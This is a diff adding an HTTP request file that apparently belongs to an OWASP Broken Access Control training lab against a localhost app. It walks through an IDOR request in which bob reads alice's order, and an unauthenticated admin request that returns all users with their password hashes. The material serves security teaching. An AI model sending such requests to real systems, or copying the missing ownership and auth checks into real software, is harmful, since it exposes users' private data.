@@ -1,0 +1,63 @@
+### =============================================================
+### OWASP A01 – Broken Access Control
+### =============================================================
+### Two attacks:
+###   (a) IDOR: bob reads alice's order
+###   (b) Admin endpoint without auth: anonymous access to every user
+### =============================================================
+
+@baseUrl = http://localhost:5218
+
+# ⚠️ Paste alice's token from 00_setup.http:
+@aliceToken = PASTE_ALICE_TOKEN_HERE
+
+# ⚠️ Paste bob's token from 00_setup.http:
+@bobToken = PASTE_BOB_TOKEN_HERE
+
+
+### --- (a) SETUP: alice places an order ---
+# Note the "id" in the response – you need it for the IDOR attack
+POST {{baseUrl}}/orders
+Authorization: Bearer {{aliceToken}}
+Content-Type: application/json
+
+{
+  "items": [
+    { "productId": 1, "quantity": 1 }
+  ]
+}
+
+###
+
+### --- (a) SETUP: bob places an order ---
+# Note the "id" in the response (it should differ from alice's)
+POST {{baseUrl}}/orders
+Authorization: Bearer {{bobToken}}
+Content-Type: application/json
+
+{
+  "items": [
+    { "productId": 2, "quantity": 2 }
+  ]
+}
+
+###
+
+### --- (a) IDOR ATTACK: bob reads alice's order ---
+# bob is logged in, but asks for order 1 (which belongs to alice).
+# Expected (secure): 403 Forbidden
+# Actual:            200 OK – bob sees alice's order ✓ VULNERABILITY
+#
+# Why? GET /orders/{id} never checks whether the order belongs to the caller.
+GET {{baseUrl}}/orders/1
+Authorization: Bearer {{bobToken}}
+
+###
+
+### --- (b) Admin endpoint without auth ---
+# No token, no login – and still every user comes back, password hashes included.
+# Expected (secure): 401 Unauthorized
+# Actual:            200 OK – the complete user list ✓ VULNERABILITY
+#
+# Why? The endpoint has no authorization requirement at all.
+GET {{baseUrl}}/admin/users
